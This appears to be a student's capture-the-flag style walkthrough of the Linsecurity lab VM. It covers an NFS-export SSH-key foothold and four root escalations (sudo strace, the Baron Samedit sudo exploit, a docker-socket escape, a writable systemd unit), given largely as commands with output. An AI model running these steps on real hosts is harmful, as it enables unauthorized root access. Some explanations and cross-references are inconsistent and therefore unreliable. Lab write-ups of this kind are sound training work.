# Target Log: Linsecurity
**Date Started:** 2026-09-13
**Target IP:** 192.168.56.102

---
## 1. Reconnaissance

### 1.1 Host Discovery
```bash
nmap -sS -T3 192.168.56.102
```

**Open ports:**

| Port | Service | Version              |
| ---- | ------- | -------------------- |
| 22   | SSH     | OpenSSH 7.6p1 Ubuntu |
| 111  | rpcbind | 2-4 (RPC #100000)    |
| 2049 | NFS     | 3-4                  |
|      |         |                      |
### 1.2 NFS Enumeration
```bash
showmount -e 192.168.56.102
```
**Key output:**
```text
Export list for 192.168.56.102:
/home/peter *
## The `*` indicates the export is available to all hosts. No authentication is required to mount it.
```
## 2. Initial Foothold
### 2.1 Mount the Share
```bash
mkdir -p /mnt/nfs
sudo mount -t nfs 192.168.56.102:/home/peter /mnt/nfs
ls -la /mnt/nfs
```
The directory contains only skeleton files (`.bashrc`, `.bash_logout`, `.profile`). No credentials are present — but the export may still be **writable**, which is the real foothold.
### 2.2 Determine the Owner UID
```bash
ls -lan /mnt/nfs
```
**Key Output:**
```trxt
drwxr-xr-x 2 1001 1001 4096 ... .
-rw-r--r-- 1 1001 1001  220 ... .bashrc
```
The directory is owned by **UID 1001**. Root is likely squashed (`root_squash`), so we must act as UID 1001 to write.
### 2.3 Write an SSH Key as UID 1001
On the attacker machine, generate a key pair if one doesn't exist:
```bash
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa
cat ~/.ssh/id_rsa.pub
```
Switch to UID 1001 and write the public key into Peter's `authorized_keys` via the mounted share:
```bash
sudo setpriv --reuid=1001 --regid=1001 --clear-groups bash
mkdir -p /mnt/nfs/.ssh
chmod 700 /mnt/nfs/.ssh
echo "ssh-rsa AAAAB3... attacker@kali" >> /mnt/nfs/.ssh/authorized_keys
chmod 600 /mnt/nfs/.ssh/authorized_keys
```
### 2.4 SSH In
```bash
ssh -i ~/.ssh/id_rsa peter@192.168.56.102
```
No password prompt. Foothold established as `peter`.
## 3. Local Enumeration
### Vector 1: `sudo -l` Misconfiguration
#### Enumeration:
```bash
sudo -l
```
**Key Output:**
```text
Matching Defaults entries for peter on linsecurity:
    env_reset, mail_badpass, secure_path=...
User peter may run the following commands on linsecurity:
    (root) NOPASSWD: /usr/bin/strace
```
Two binaries are runnable as `root` without a password. Both are GTFOBins.

#### Exploitation:
```bash
sudo strace -o /dev/null /bin/sh
```
**Output:**
```text
uid=0(root) gid=0(root) groups=0(root)
```
**Why It Works:**
`sudo` grants Peter the right to execute specific binaries as **root** with no password. The `strace` binary contains an `-o` flag that runs arbitrary commands **as the user executing `strace`** — which, under `sudo`, is root. The spawned shell inherits root's UID because `sudo` never drops privileges for the duration of the command.

The critical detail: this only works when invoked **with `sudo`**. Running `strace -o /dev/null /bin/sh` as Peter spawns a Peter shell. The privilege comes from `sudo`, not from the binary itself.

## Vector 2: CVE-2021-3156 (Baron Samedit) in `sudo`

#### Enumeration
```bash
sudo --version
```
**Key Output:**
```text
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
```
Version `1.8.21p2` is **within the vulnerable range** for CVE-2021-3156 (heap-based buffer overflow in `sudoedit`). The bug affects sudo versions from **1.8.2 through 1.8.31p2** and **1.9.0 through 1.9.5p1**. This build is vulnerable.

#### Exploitation
Confirm the vulnerability without triggering it first:
```bash
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```
**KeyOutput:**
```text
malloc(): corrupted top size
Segmentation fault (core dumped)
```
**On Kali:**
On attacker machine, clone the public exploit repository:
```bash
git clone https://github.com/worawit/CVE-2021-3156
cd /CVE-2021-3156
# Transfer to the target
cat exploit_nss.py | ssh peter@192.168.56.102 "cat > /tmp/exploit_nss.py"
```
**On the target:**
```bash
chmod +x /tmp/exploit_nss.py
/tmp/exploit_nss.py
```
**Key Output:**
```text
# id
uid=0(root) gid=0(root) groups=0(root)
```
### Why it worked

CVE-2021-3156 is a heap overflow in how `sudoedit` parses command-line arguments. When `sudoedit` runs in **shell mode** (`-s`) and processes an argument ending in a backslash, it allocates a buffer of one size but writes data of a larger size, corrupting the heap.

Because `sudo` is SUID root, the corrupted heap is in a process running with root's effective UID. The attacker controls the overflow contents, which allows overwriting adjacent heap metadata and eventually hijacking execution flow to run a root shell. The backslash suffix is the key trigger — without it, the parsing path is different and the overflow doesn't occur.

## Vector 3 — Docker Socket (`/var/run/docker.sock`)
### Enumeration
```bash
id
```
**Key Output:**
```text
uid=1001(peter) gid=1001(peter) groups=1001(peter),999(docker)
```
```bash
ls -la /var/run/docker.sock
```
***Output:***
```text
  
srw-rw---- 1 root docker 0 Sep 14 07:55 /var/run/docker.sock
```
Peter is in the `docker` group. The socket is group-readable and group-writable. Any process Peter starts can communicate with the Docker daemon, which runs as **root**.
### Exploitation
Attempt the standard bind-mount escape:
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
**Error:**
```text
Unable to find image 'alpine:latest' locally
docker: Error response from daemon: Get https://registry-1.docker.io/v2/: dial tcp:
lookup registry-1.docker.io on 127.0.0.53:53: server misbehaving.
```
The target has no internet access, so the image cannot be pulled. Workaround: build a local image from a rootfs tarball.

**On Kali (has internet):**
```bash
wget https://dl-cdn.alpinelinux.org/alpine/v3.23/releases/x86_64/alpine-minirootfs-3.23.0-x86_64.tar.gz
# Transfer to the target
cat alpine-minirootfs-*.tar.gz | ssh peter@192.168.56.102 "cat > /tmp/alpine.tar.gz"
```
**On the target:**
```bash
docker import /tmp/alpine.tar.gz alpine-local:latest
docker run -v /:/mnt --rm -it alpine-local:latest chroot /mnt sh
```
**Inside the chroot:**
```bash
id
```
**Output:**
```text
uid=0(root) gid=0(root) groups=0(root)
```
### Why it worked
The Docker daemon runs as `root` and exposes a UNIX socket at `/var/run/docker.sock`. Because Peter is in the `docker` group, he can issue API calls to that socket. The daemon trusts any client that can reach the socket — there is no additional authentication.

The `docker run -v /:/mnt` flag instructs the daemon to bind-mount the **host's root filesystem** into the container at `/mnt`. The `chroot /mnt sh` command then changes the container's root to the host's root, and because the container process runs as root (Docker's default), the resulting shell has root privileges on the host filesystem.

Key insight: **Docker group membership is root-equivalent**. The daemon's API allows mounting arbitrary host paths, which means a member of the `docker` group can always read/write anything on the host.

## Vector 4: `/lib/systemd/system/debug.service` (Writable Unit File)
#### Enumeration
```bash
find / -writable -name "*.service" 2>/dev/null
```
**Output:**
```text
/lib/systemd/system/debug.service
```
```bash
ls -la /lib/systemd/system/debug.service
```
**Output:**
```text
-rw-rw-r-- 1 root peter 245 Sep 14 07:55 /lib/systemd/system/debug.service
```
The file is group-writable by `peter`. Its content:
```bash
cat /lib/systemd/system/debug.service
```
**Output:**
```text
[Unit]
Description=Debug Service
[Service]
Type=root
ExecStart=/usr/local/bin/debug.sh
[Install]
WantedBy=multi-user.target
```
The service runs `/usr/local/bin/debug.sh` as root.
#### Exploitation
First, check whether the referenced script exists and is writable:
```bash
ls -la /usr/local/bin/debug.sh
```
If it does **not** exist, create it. If it does exist and is writable, overwrite it.
```bash
cat > /usr/local/bin/debug.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod u+s /tmp/rootbash
EOF
chmod +x /usr/local/bin/debug.sh
```
Reload systemd and trigger the service:
```bash 
systemctl daemon-reload
systemctl restart debug.service
```
  Then execute the SUID bash:
  ```bash
/tmp/rootbash -p
id
  ```
  **Output:**
  ```text    
uid=0(root) gid=0(root) groups=0(root)
  ```
#### Why it worked
Systemd unit files under `/lib/systemd/system/` are read by systemd (PID 1) and executed as root. If an unprivileged user can modify the unit file — or a script the unit calls — they control what root executes the next time the unit is started or reloaded.

The `ExecStart=` directive is the command systemd runs. Because `User=` was unset, the process ran as root. The SUID-bash payload turns `/bin/bash` into a root-owned SUID binary, which any user can then run with `-p` to preserve the effective UID of 0.

The two prerequisites are:
1. Write access to the unit file or a script it invokes.
    
2. A way to make systemd reload and restart the unit (`systemctl daemon-reload` + `systemctl restart`). If the user lacks those rights, the payload may still execute on the next reboot if the unit is enabled.

---
# Failed / Dead-End Vectors
These were investigated and confirmed **not exploitable**. They are documented because they appear in enumeration output and can mislead an analyst into chasing them.

---
## Failed Vector 1 — `xxd` SUID Binary
### Enumeration
```bash
find / -perm -4000 -type f 2>/dev/null
```
**Output:**
```text
/usr/bin/xxd
```
```bash
ls -la /usr/bin/xxd
```
**Output:**
```text
-rwsr-x--- 1 root docker 128488 Sep 14 07:55 /usr/bin/xxd
```
SUID bit set, owner `root`, group `docker`, mode `rwsr-x---`.
### Why it failed
The execute bit for "other" is unset (`---`). Execution is restricted to `root` (owner) and members of `docker` (group).
### Lesson
A SUID bit on disk does not guarantee the kernel honors it. Always verify by attempting to read a root-only file. If `cat /etc/shadow` still fails after invoking the SUID binary, the bit is being ignored.

## Failed Vector 2: `mtr-packet` Capability
### Enumeration
```bash
getcap -r / 2>/dev/null
```
**Output:**
```text
/usr/bin/mtr-packet = cap_net_raw+ep
```
### Why it failed
`cap_net_raw` grants only the ability to open raw sockets. It does **not** grant `cap_setuid`, `cap_setgid`, or any capability that would allow changing UID or reading arbitrary files. The binary is designed to run `setuid`-free but still send ICMP packets.

This is the **intended, secure configuration** for `mtr-packet` on modern distributions. There is no privilege escalation primitive here.
### Lesson
Not every capability is exploitable. Only capabilities that directly affect privilege boundaries (`cap_setuid`, `cap_setgid`, `cap_dac_read_search`, `cap_sys_admin`) are useful for PE. `cap_net_raw` is a network primitive, not a privilege primitive.

## Failed Vector 3: Writable UDS Sockets (`acpid`, `dbus/system_bus_socket`, `rpcbind`, `snapd`, `systemd/*`)
### Enumeration
```bash
find / -type s -writable 2>/dev/null
```
**Output:**
```text
/run/acpid.socket
/run/dbus/system_bus_socket
/run/rpcbind.sock
/run/snapd.socket
/run/systemd/private
/run/systemd/journal/dev-log
...
```
### Why it failed
Each socket was probed individually:
- **`acpid.socket`**: The daemon accepts only privileged events from the kernel; no user-controllable input path.
    
- **`dbus/system_bus_socket`**: D-Bus services on the system bus enforce polkit authentication for privileged methods. Attempts to call `org.freedesktop.systemd1.StartTransientUnit` returned `Interactive authentication required`.
    
- **`rpcbind.sock`**: Only exposes RPC registration operations; no command execution.
    
- **`snapd.socket`**: `snap version` reported `2.48+`, well past the `2.37.1` cutoff for Dirty Sock (CVE-2019-7304).
    
- **`systemd/private`**: `systemd-run --system` returned `Access denied` due to polkit policy.
    
### Lesson
"Writable socket" does not equal "exploitable socket." A writable UDS is only useful if:
1. The service behind it runs as root, **and**
2. The service exposes a method that performs a privileged action based on client input, **and**
3. No authentication layer (polkit, SO_PEERCRED checks, ACLs) blocks the call.

Enumerating a socket is step one. You must then enumerate the protocol (via `busctl introspect`, `strace`, or reading the service's source/docs) to know whether it accepts dangerous input.

---
## 3. Post-Lab Retrospective

### What worked best

- **Trusting `showmount` output.** Seeing `/home/peter *` was the turning point. Instead of dismissing NFS because the directory looked empty, I tested writability and matched the UID. That single decision turned an unauthenticated port into a full foothold.
    
- **Using `setpriv` instead of `su`.** When `su peter` asked for a password, the fix was to change effective UID directly rather than authenticate. Recognizing that `su` and `setpriv` solve different problems saved the chain.
    
- **Pivoting when Docker couldn't pull images.** The `registry-1.docker.io` DNS failure looked like a wall, but building a local image from an Alpine rootfs on Kali and importing it sidestepped the internet requirement entirely.
    
- **Confirming each finding before exploiting it.** The vectors that worked (`sudo -l`, `docker.sock`, the service file) were all verified with `ls -la` or a test command first. The ones that failed (the second `debug.service`, the SUID `xxd`) failed _because_ I confirmed them — which meant I stopped wasting time instead of chasing ghosts.
    
- **Documenting dead ends.** Treating `mtr-packet`, the writable UDS sockets, and the phantom service file as findings worth writing down (and explaining why they failed) made the final writeup more useful than a list of wins.

### Where I got stuck

- **The `su` password prompt.** I didn't immediately realize that `su` requires the _target user's_ password and that a UID-matched account with no password can never satisfy it. Switching to `setpriv --reuid=1001` was the unlock.
    
- **The `GLIBC_2.34` error on the PwnKit binary.** Compiled on Kali (newer glibc), it refused to run on the target (glibc 2.27). This cost time before I understood the version mismatch.
    
- **Chasing enumeration noise.** The `xxd` SUID bit, the `mtr-packet` capability, the writable UDS sockets, and the phantom `/lib/systemd/debug.service` all looked promising at first glance. Each one took time to rule out. The pattern was consistent: _the finding wasn't real until `ls -la` confirmed it._
    
- **Assuming `docker run` would just work.** The DNS failure inside the target meant no image pull. The workaround (import a local rootfs) wasn't obvious until I stopped thinking "pull from Docker Hub" and started thinking "the daemon only needs a tarball."
    
- **Distinguishing "writable" from "exploitable."** A writable socket is not a vulnerability unless the service behind it performs a privileged action based on client input. Learning to enumerate the _protocol_, not just the file permissions, was the hardest conceptual shift.


**Author:** Nickson Ngugi  Kihugu
**Date:** 21-09-2026  
**Disclaimer:** For educational purposes only. All testing was performed against a lab environment the author is authorized to test.